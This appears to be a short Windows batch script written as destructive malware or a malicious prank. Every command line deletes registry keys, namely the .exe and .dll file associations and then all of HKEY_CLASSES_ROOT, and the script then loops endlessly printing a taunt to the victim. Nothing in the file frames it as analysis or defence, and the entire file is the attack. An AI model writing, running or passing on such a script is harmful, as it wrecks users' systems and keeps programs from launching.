@ECHO OFF
START reg delete HKCR/.exe
START reg delete HKCR/.dll
START reg delete HKCR/*
:MESSAGE
ECHO Sorry bro but today you have bad luck;)
GOTO MESSAGE
